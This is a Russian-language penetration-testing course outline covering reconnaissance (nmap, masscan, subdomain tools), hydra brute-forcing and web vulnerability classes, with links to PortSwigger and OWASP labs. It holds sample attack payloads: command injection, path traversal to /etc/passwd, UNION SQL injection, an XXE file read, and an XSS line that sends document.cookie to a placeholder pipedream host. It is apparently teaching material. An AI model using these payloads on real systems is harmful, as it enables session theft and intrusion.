# Pentest-course
# Please read it at raw format

1. Разветка 
	1.0 Информация о домене
		(BASH) host domain.ru
		(BASH) whois host.ru
	1.1 Поддомены 
		1.1.1 Пассивные
			https://dnsdumpster.com/
			https://crt.sh/       		(Более расширенный способ)
			https://www.shodan.io/
			https://censys.com/			(Нужно регаться)
			https://pentest-tools.com/	(Нужно регаться)
		1.1.2 Активные
		 	(BASH) amass enum -v -src -ip -d host.ru
		 	(BASH) subfinder -d host.ru
	1.2 Перебор поддоменов 
		(АКТИВНЫЕ)
		1.2.1 (BASH) subfinder -d host.ru
		1.2.2 Другие способы поиска сабдоменов
			1.2.2.1 (BASH_TOOLS) amass			https://github.com/owasp-amass/amass
			1.2.2.2 (BASH_TOOLS) Sublist3r		https://github.com/aboul3la/Sublist3r
			1.2.2.3 (BASH_TOOLS) assetfinder	https://github.com/tomnomnom/assetfinder
			1.2.2.4 (BASH_TOOLS) subfinder
		(ПАССИВНЫЕ)	(ВЕБ-РЕСУРСЫ)
		1.2.3 (WEB_TOOLS) dnsdumpster.com
		1.2.4 (WEB_TOOLS) shodan.io
		1.2.5 (WEB_TOOLS) censys.io
		1.2.6 (WEB_TOOLS) crt.sh
		1.2.7 (WEB_TOOLS) pentest-tools.com
	1.3 Сканер сети
		1.3.1 (BASH_TOOLS) Nmap		- один из самых популярных сканеров сети	https://nmap.org/
		1.3.2 (BASH_TOOLS) Zenmap	- GUI для nmap								https://nmap.org/zenmap/
		1.3.3 (BASH_TOOLS) Masscan	- быстрый сканер сети IPv4					https://github.com/robertdavidgraham/masscan
	1.4 Сканеры сети на примере использования
		1.4.1 (BASH) nmap -sn--traceroute <network> (192.168.88.0/24)
		1.4.2 (BASH) masscan 10.0.0.0/8 192.168.0.0/16 172.16.0.0/12 -p80 --open-only		(флаг "-D" для того, чтобы скрыть IP атакующего)
	1.5 Сканирование портов
		1.5.1 (BASH) nmap -sT <example.com> – полное TCP сканирование узла с использованием полнеценного соединения
		1.5.2 (BASH) nmap -sS <example.com> – TCP-SYN сканирование узла с неполным соединением
		1.5.3 (BASH) nmap -sU <example.com> – UDP сканирование узла
		1.5.4.1 Дополнительныя информация
			1. Эффективность техники сканирования
				Для оптимизации скорости сканирования — можно использовать шаблоны управления временем с помощью ключа -Т. Возможные варианты: paranoid(0), sneaky(1), polite(2), normal(3), aggressive(4) и insane(5)
				Пример: (BASH) nmap -Т4 <example.com>
			2. Подмена IP или MAC
				"-spoof-mac" для изменения MAC адреса атакующего узла и флаг "-S" для изменения его IP адреса.
			3. Сканирование всех портов
				Ключ "-p-" используется для сканирования всех портов
			4. Скрипты
				У nmap есть свой набор скриптов, которые способны дать определённую информацию при сканировании. Они делятся на следующие типы: safe, (intrusive), malware, version, discovery, vuln, auth и default. Что бы при сканировании работал какой — то конкретный скрипт или группа скриптов, то следует запускать с ключом —script.
				Пример: (BASH) sudo nmap --script <категории - скриптов>|<директория>|<имя_файла>|all <example.com>.
			5. Дополнительные флаги использования
				Ключ -sV позволяет узнать версию используемых служб.
				Ключ -sL позволяет определить имя сетевого узла, сканирование которого и происходит.
				Ключ -v выводит подробную информацию о результатах сканирования. Есть еще -vv и -vvv
				Ключ -6 позволит использовать при сканировании IPv6 вместо IPv4.
				Ключ -Pn позволяет отключить проверки доступности узла с помощьюICMPпакетов, так как некоторые FireWall настроены на откидывание данных пакетов, в следствии чего не удастся просканировать узел. Однако данный ключ замедляет сканирование системы.
			6. Нестандартные методики сканирования
				Null сканирование (-sN): не устанавливаются никакие биты (Флагов в TCP заголовке 0).
				FIN сканирование (-sF): устанавливается только TCP FIN бит.
				Xmas сканирование (-sX): устанавливаются FIN, PSH и URG флаги.
				TCP ACK сканирование (-sA): данный тип сканирование направлен на изучение особенностей реагирования Firewall. Если порт не фильтруется, то будет возвращаться TCP ответ с флагом RST.
				TCP Window сканирование (-sW): данный тип сканирование похож сутью работы на TCP ACK, но при этом способен определять, закрыт или открыт порт за счёт анализа поля TCP Window в RST ответе. В некоторых системах открытые порты используют положительное значение этого поля (даже в RST пакетах), а закрытые — нулевое.
				TCP сканирование Мэймона (-sM): этот тип сканирования носит имя своего первооткрывателя, Уриела Мэймона. Техника практически такая же, как и при NULL, FIN и Xmas сканированиях, только в качестве запросов используются запросы FIN/ACK. Согласно RFC 793 (TCP), в ответ на такой запрос должен быть сгенерирован RST пакет, если порт открыт или закрыт. Однако многие BSD системы просто отбрасывают пакет, если порт открыт.
				Зомби сканирование (-sI): данный метод сканирование позволяет полностью анонимно просканировать узел на информацию о состояние портов, так как сканирование происходит от лица другого узла.
				FTP bounce сканирование (-b): данный метод сканирования основан на возможности одного FTP сервера обмениваться файлами с другим FTP сервером. Этот метод позволяет достигнуть анонимности, но сейчас крайне мало шансов, что он сработает, так как многие FTP сервера пере конфигурированы так, что они не могут отправлять между собой файлы.
			7. Дополнительные материалы
				Ссылка на официальную документацию: https://nmap.org/man/ru/
2. Реализация атаки первичного доступа WEB приложения (Pentest)
	2.1 Утилиты для перебора путей
		Можно использовать любые словари, но я подготовил довольно эффективный
			https://github.com/empty-jack/YAWR/blob/master/Web/files_and_directories/fuzz.txt
		1. ffuf
		Пример: ffuf -w /path/to/wordlist -u http://host.ru:1337/FUZZ
		Дополнительные флаги:
			1. "-fc" (code). Пример: "-fc 403"
			2. "-fs" (size). ПРимер: "-fs 251"
	2.2 Использование Burp Suite для анализа пакетов
		1. Proxy - перехват и анализ пакетов
		2. Intruder - использование полей пакета для внедрения/изменения/перебора/эксплуатации
	2.3 Другие приложения для перебора пароля на веб странице
		1. Patator
		2. Medusa
		3. Hydra
		4. Owasp Zap
		Пример использования:
			(BASH) hydra -l administrator -P ./realyBest.txt -s 1337 127.0.0.1 http-post-form -m "/admin/:username=^USER^&password=^PASS^:g=:2=:F=>Login</button>"
							(username)		 (wordlist)       (port) (host)    (metod)            (path in site with post data)
	2.4 Уязвимости
		Типовые уязвимости по механизмам, где они происходят:
			1. Уязвимости механизмов аутентификации
			2. Уязвимости механизмов авторизации
			3. Уязвимости загрузки файлов
			4. Уязвимости раскрытия информации
			5. Уязвимости в системах криптографии и др.

		Типовые уязвимости по характеру их эксплуатации:
			1. Уязвимости состояния гонки (race condition)
			2. Уязвимости некорректной нейтрализации управляющих конструкций при генерации веб-страниц (атаки межсайтового скриптинга)
			3. Уязвимости подделки запроса со стороны сервера (SSRF)
			4. Уязвимости подделки запроса со стороны клиента (CSRF) и др.

		Типовые уязвимости по технологиям, в которых они происходят:
			1. Уязвимости SQL инъекций
			2. Уязвимости внедрения внешних сущностей в XML-документы
			3. Уязвимости инъекций в ORM-запросах
			4. Уязвимости инъекций в LDAP-запросах
			5. Уязвимости инъекции команд или аргументов в запросах к терминальной оболочке ОС

		Материалы для изучения
			1. OWASP TOP 10: на сегодняшний день актуальной является версия от 2021 года 											(https://owasp.org/www-project-top-ten/)
			2. PortSwigger Academy: открытая платформа обучения, сфокусированная в направлении безопасности веб-приложений			(https://portswigger.net/web-security/all-topics)
			3. DVWA: уязвимое приложение для практики и проверки знаний 															(https://github.com/digininja/DVWA)
	2.5 Аутентификация
		Обход двухфакторной аутентификации по разным причинам:
			1. Иногда реализация двухфакторной аутентификации бывает настолько несовершенной, что ее можно обойти полностью.
			2. Иногда ошибочная логика двухфакторной аутентификации означает, что после того, как пользователь выполнил начальный шаг входа в систему, веб-сайт не может адекватно проверить, что этот же пользователь выполняет второй шаг.
			3. А также, как и в случае с паролями, веб-сайты должны принимать меры по предотвращению перебора проверочного кода 2FA. Это особенно важно, потому что код часто представляет собой простое 4-х или 6-значное число. Без адекватной защиты взлом такого кода тривиален.

		Сторонние механизмы аутентификации, которые также могут быть уязвимы:
			1. Механизм поддержания сессии «запомнить меня»
			2. Механизм сброса пароля через E-mail
			3. Механизм сброса пароля с использованием URL и одноразового токена
			4. Механизм смены пароля

		Материалы для самостоятельного изучения:
			1. Серия нерегулярного подкаста с обсуждением основных атак на аутентификацию и угон аккаунтов							(https://t.me/cybersec_in_russian/5)
			2. OWASP-памятка по реализации механизмов аутентификации																(https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Authentication_Cheat_Sheet.md)

		Тренироваться на упражнениях можно на открытых платформах. Одна из лучших платформ по изучению проблем безопасности веб-приложений: PortSwigger Academy. (https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)

		Попрактикуемся в атаках на аутентификацию																					(https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)

		Так же настоятельно рекомендуем ознакомится с различными инструментами, используемыми для брутфорсинга (hydra, medusa, patator и др.):
			1. hydra 		(https://www.kali.org/tools/hydra/)
			2. medusa		(https://www.kali.org/tools/medusa/)
			3. patator		(https://www.kali.org/tools/patator/)

	2.6 Уязвимости инъекции команд ОС
		При нахождении уязвимости необходимо выполнить базовые команды
			pwd
			id
			export
		Примеры уязвимости
			ping ... | id
			ping ... ; id
			ping ... ; id #
	2.7 Уязвимость контроля доступа
		Например мы можем редактирвоать некоторые параменты в запросах
		http://localhost:1337/receipt.php?orderID=1					Где мы можем изменить/перебрать параметр "orderID"
	2.8 Path Traversal
		../../../../../etc/passwd переходит в /home/users/phpguru/templates/../../../../../etc/passwd, что эквивалентно /etc/passwd

		Материалы для изучения
			Как избегать уязвимостей Directory Traversal																			(https://wiki.owasp.org/index.php/File_System#Path_traversal)
			PayloadsAllTheThings - Directory Traversal																				(https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
			Пример проблемы																											(https://portswigger.net/web-security/file-path-traversal/lab-simple)

		Примеры с HackerOne:
			https://hackerone.com/reports/311216
			https://hackerone.com/reports/827052
	2.8 SQL-инъекции
		О техниках атак
			Существует широкий спектр уязвимостей, атак и методов SQL инъекции, которые возникают в различных ситуациях. К числу наиболее распространенных примеров SQL-инъекций относятся:
				Stacked queries — инъекция SQL-запросов, позволяющая злоумышленнику выполнить несколько запросов за один раз.
				Union-based — инъекция, использующая оператор UNION для объединения результатов двух запросов, что позволяет злоумышленнику извлекать данные из других таблиц.
				Error-based — инъекция, основанная на ошибке, которая может возникнуть при выполнении запроса, что позволяет злоумышленнику получать информацию об уязвимости.
				Boolean blind — инъекция, при которой злоумышленник использует булевы выражения для проверки наличия или отсутствия определенных данных в базе данных.
				Time-based — инъекция, которая использует задержку выполнения запроса для получения информации о базе данных.
				Out of band — инъекция, которая не взаимодействует с сайтом напрямую, а использует другой канал для передачи данных, например, отправку электронной почты или HTTP-запросов.

		Материалы для самостоятельного изучения
			База знаний по возможностям в языке SQL разных СУБД 																	(https://websec.ca/kb/sql_injection)
			Wiki по инъекциям SQL																									(https://sqlwiki.netspi.com/)
			PayloadsAllTheThings - SQL injection																					(https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
			PayloadsAllTheThings - NoSQL injection																					(https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
			OWASP NoSQL injection slides																							(https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf)
			PortSwigger - SQL injection cheat sheet																					(https://portswigger.net/web-security/sql-injection/cheat-sheet)
			SQLMap - Инструмент автоматизации																						(https://xakep.ru/2011/12/06/57950/)

		Практика:
			Навыки работы с SQL 																									(https://www.sql-ex.ru/?Lang=0)
			Для начинающих																											(https://portswigger.net/web-security/sql-injection)
			Для того, чтобы попрактиковаться в более сложных кейсах (Ищем "SQL" в названии задач)									(https://www.root-me.org/ru/Zadachi-i-problemy/Veb-server/)

		-1 UNION SELECT 1,2,3,4,GROUP_CONCAT(COLUMN_NAME, '-'),6,7,8 FROM INFORMATION_SCHEMA.columns WHERE table_name='super_secret_table' -- -
		-1 UNION SELECT 1,2,3,4,super_secret_column,6,7,8 FROM super_secret_table -- -

	2.9 XML-инъекции (XXE)
		<?xml version="1.0" encoding="UTF-8"?><order><name>asd asd</name><email>asd@asd.asd</email><phone>asdasd</phone><comment>asd</comment><productID>Beginer</productID><price>5</price></order>
	to exploit version
		<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE order [<!ENTITY file SYSTEM "file:///var/www/secret">]><order><name>asd asd</name><email>asd@asd.asd</email><phone>asdasd</phone><comment>&file;</comment><productID>Beginer</productID><price>5</price></order>

	2.10 Межсайтовый скриптинг (XSS)
		+79117238383"><img src=x onerror=fetch('https://ADDR.x.pipedream.net/?'+document.cookie) />

		Материалы для самостоятельного изучения:
			Простейший пример уязвимости																								(https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
			Наиболее объемный набор лабораторных работ с хорошими кейсами: практики portswigger.									(https://portswigger.net/web-security/all-labs#cross-site-scripting)
			Механизмы обеспечения безопасности клиентской части																		(https://developer.mozilla.org/en-US/docs/Web/Security)
			Основополагающие механизмы в работе браузера:
				SOP																													(https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
				CORS																												(https://developer.mozilla.org/en-US/docs/Glossary/CORS)
				понятие "источника"																									(https://developer.mozilla.org/en-US/docs/Glossary/Origin)
				URL																													(https://url.spec.whatwg.org/#origin)
3. Эксплуатация известных уязвимостей сетевых сервисов










	













Дополнительные материалы
	1. Большой список шпаргалок для уязвимостей 																					(https://github.com/OWASP/CheatSheetSeries/)
	2. PortSwigger Academy: открытая платформа обучения, сфокусированная в направлении безопасности веб-приложений			(https://portswigger.net/web-security/all-topics)

